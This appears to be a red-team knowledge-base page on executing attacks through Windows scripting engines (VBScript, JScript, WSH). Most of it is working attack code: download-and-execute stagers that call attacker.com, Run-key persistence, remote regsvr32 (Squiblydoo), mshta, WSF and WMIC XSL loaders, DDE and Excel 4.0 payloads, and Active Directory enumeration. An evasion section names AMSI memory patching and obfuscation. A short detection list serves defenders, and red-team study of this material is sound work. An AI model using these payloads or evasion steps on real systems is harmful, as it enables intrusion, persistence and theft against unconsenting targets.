# Scripting Engines (VBScript, JScript, WSH)

> **MITRE ATT&CK**: Execution > T1059.005 / T1059.007 - Command and Scripting Interpreter: VBScript / JScript
> **Platforms**: Windows
> **Required Privileges**: User
> **OPSEC Risk**: Medium (legitimate automation tools, but script execution is increasingly monitored)

---

## Strategic Overview

VBScript, JScript, and Windows Script Host (WSH) represent legacy scripting engines deeply embedded in Windows. While Microsoft has begun deprecating VBScript in newer Windows versions, these engines remain present on the vast majority of enterprise systems and are still leveraged in initial access campaigns, lateral movement, and persistence. For a Red Team Lead, these scripting engines offer versatility: they can interact with COM objects, access the file system, make network requests, and execute system commands -- all without requiring PowerShell. The key strategic advantage is that organizations may focus defensive monitoring on PowerShell while leaving WSH-based execution less scrutinized. However, AMSI integration (Windows 10+) now scans VBScript and JScript content, requiring obfuscation or bypass techniques.

## Technical Deep-Dive

### VBScript Execution

```vbscript
' Basic VBScript command execution (save as .vbs)
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c whoami > C:\temp\output.txt", 0, True

' Execute PowerShell from VBScript
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/p.ps1')", 0, False

' Download and execute using XMLHTTP + ADODB.Stream
Dim http, stream
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://attacker.com/payload.exe", False
http.Send
Set stream = CreateObject("ADODB.Stream")
stream.Open
stream.Type = 1 ' Binary
stream.Write http.responseBody
stream.SaveToFile "C:\temp\payload.exe", 2
stream.Close
Set objShell = CreateObject("WScript.Shell")
objShell.Run "C:\temp\payload.exe", 0, False
```

```bash
# Execute VBScript from command line
cscript.exe //nologo C:\temp\payload.vbs
wscript.exe C:\temp\payload.vbs
```

### JScript Execution

```javascript
// Basic JScript command execution (save as .js)
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe /c net user", 0, true);

// File system operations
var fso = new ActiveXObject("Scripting.FileSystemObject");
var file = fso.CreateTextFile("C:\\temp\\output.txt", true);
file.WriteLine("data exfiltrated");
file.Close();

// Registry operations
var shell = new ActiveXObject("WScript.Shell");
shell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
    "C:\\temp\\payload.exe", "REG_SZ");

// WMI process creation from JScript
var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
var process = wmi.Get("Win32_Process");
var method = process.Methods_("Create");
var inParams = method.InParameters.SpawnInstance_();
inParams.CommandLine = "cmd.exe /c whoami > C:\\temp\\out.txt";
process.ExecMethod_("Create", inParams);
```

```bash
# Execute JScript from command line
cscript.exe //E:jscript C:\temp\payload.js
wscript.exe C:\temp\payload.js
```

### Windows Script Host (WSH) Objects

Core COM objects available to both VBScript and JScript for system interaction.

```
WScript.Shell          - Execute commands, registry access, environment variables
Scripting.FileSystemObject - File/folder CRUD operations
ADODB.Stream           - Binary data handling, file I/O
MSXML2.XMLHTTP         - HTTP requests (download payloads)
MSXML2.ServerXMLHTTP   - Server-side HTTP (avoids proxy issues)
WScript.Network        - Network drive mapping, printer connections, user/domain info
Shell.Application      - Explorer shell operations, ShellExecute (UAC bypass potential)
Schedule.Service       - Scheduled task creation and management
WbemScripting.SWbemLocator - WMI access from scripts
```

### Scriptlet Files (.sct) with Regsvr32

Scriptlets are XML files containing JScript or VBScript that can be loaded via COM registration.

```xml
<?XML version="1.0"?>
<scriptlet>
  <registration
    description="PoC"
    progid="PoC"
    version="1.0"
    classid="{AAAA0000-0000-0000-0000-0000FEEDACDC}"
    remotable="true">
    <script language="JScript">
      <![CDATA[
        var r = new ActiveXObject("WScript.Shell");
        r.Run("cmd.exe /c calc.exe", 0);
      ]]>
    </script>
  </registration>
</scriptlet>
```

```bash
# Load remotely (Squiblydoo)
regsvr32.exe /s /n /u /i:https://attacker.com/payload.sct scrobj.dll
```

### HTA Files (HTML Applications)

HTA files run with full trust outside the browser sandbox.

```html
<html>
<head>
<script language="VBScript">
Sub RunPayload()
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell.exe -nop -w hidden -enc AAAA...", 0, False
    self.close
End Sub
</script>
</head>
<body onload="RunPayload()">
</body>
</html>
```

```bash
# Execute HTA remotely
mshta.exe https://attacker.com/payload.hta
```

### WSF Files (Windows Script Files)

WSF files can contain multiple script languages and reference external scripts.

```xml
<?xml version="1.0"?>
<package>
  <job id="main">
    <script language="JScript">
      var shell = new ActiveXObject("WScript.Shell");
      shell.Run("calc.exe");
    </script>
    <script language="VBScript">
      ' VBScript and JScript can coexist in a WSF
      MsgBox "Executed from WSF"
    </script>
  </job>
  <job id="alternate">
    <script language="JScript" src="https://attacker.com/remote.js" />
  </job>
</package>
```

```bash
# Execute specific job from WSF
cscript.exe payload.wsf //job:main
```

### COM Object Instantiation from Scripts

Scripts can instantiate any registered COM object, enabling broad system access.

```javascript
// Access Active Directory via ADSI
var root = GetObject("LDAP://RootDSE");
var domain = root.Get("defaultNamingContext");
var conn = new ActiveXObject("ADODB.Connection");
conn.Provider = "ADsDSOObject";
conn.Open("ADs Provider");
var rs = conn.Execute("<LDAP://" + domain + ">;(objectClass=user);name,distinguishedName;subtree");

// Access Task Scheduler
var scheduler = new ActiveXObject("Schedule.Service");
scheduler.Connect();
var rootFolder = scheduler.GetFolder("\\");
var tasks = rootFolder.GetTasks(0);

// Access WMI
var locator = new ActiveXObject("WbemScripting.SWbemLocator");
var service = locator.ConnectServer(".", "root\\cimv2");
var processes = service.ExecQuery("SELECT * FROM Win32_Process");
```

### XSL Transformation (WMIC Abuse)

XSLT stylesheets can contain embedded JScript that executes via WMIC.

```xml
<!-- payload.xsl -->
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="https://attacker.com">
  <msxsl:script language="JScript" implements-prefix="user">
    function exec(){
      var shell = new ActiveXObject("WScript.Shell");
      shell.Run("cmd.exe /c whoami > C:\\temp\\xsl_out.txt");
    }
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:exec()"/>
  </xsl:template>
</xsl:stylesheet>
```

```bash
# Execute XSL transformation via WMIC
wmic os get /format:"https://attacker.com/payload.xsl"
wmic os get /format:"C:\temp\payload.xsl"

# msxsl.exe (if present on target)
msxsl.exe data.xml payload.xsl
```

### Macro-Free Office Exploitation

Techniques that do not rely on traditional VBA macros.

```
- DDE (Dynamic Data Exchange): =cmd|'/c calc.exe'!A0
  Inserted into Excel/Word fields; prompts user but no macro warning
- Template injection: Document references remote .dotm template with macros
  The document itself contains no macros, bypassing email filters
- Excel 4.0 macros (XLM): Legacy macro format less analyzed by AV
  =EXEC("cmd.exe /c calc.exe")
  =HALT()
- Add-in files (.xll): Compiled DLLs loaded by Excel
```

## Detection & Evasion

### Detection Mechanisms
- **AMSI**: Windows 10+ scans VBScript and JScript content at runtime
- **Sysmon Event ID 1**: Process creation showing wscript.exe/cscript.exe with arguments
- **Script Block Logging (WSH)**: Windows 10+ can log WSH script content
- **Event ID 4688**: Command line auditing captures script execution
- **ETW providers**: Microsoft-Windows-Wmi-Activity for WMIC XSL abuse

### Evasion Techniques
- AMSI bypass via memory patching before script execution
- String obfuscation in VBScript/JScript (concatenation, chr() encoding)
- Use environment variable expansion to build command strings dynamically
- Execute scripts from trusted directories to appear legitimate
- Use WSF files with innocuous names mimicking legitimate automation
- VBScript/JScript obfuscators to defeat static analysis

### OPSEC Considerations
- wscript.exe and cscript.exe making network connections are suspicious
- HTA files spawning cmd.exe or powershell.exe are high-confidence alerts
- Microsoft is deprecating VBScript; its use may become anomalous over time
- Consider the script host (wscript = GUI, cscript = console) based on context

## Cross-References

- `03-execution/lolbins.md` - MSHTA, regsvr32, and WMIC execution details
- `03-execution/powershell-execution.md` - PowerShell as alternative scripting engine
- `02-initial-access/` - Script-based initial access payloads
- `04-persistence/wmi-event-subscriptions.md` - ActiveScriptEventConsumer

## References

- Microsoft WSH Documentation: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc738350(v=ws.10)
- LOLBAS Script Engines: https://lolbas-project.github.io/
- MITRE T1059.005 (VBScript): https://attack.mitre.org/techniques/T1059/005/
- MITRE T1059.007 (JScript): https://attack.mitre.org/techniques/T1059/007/
- XSL Script Processing: https://attack.mitre.org/techniques/T1220/
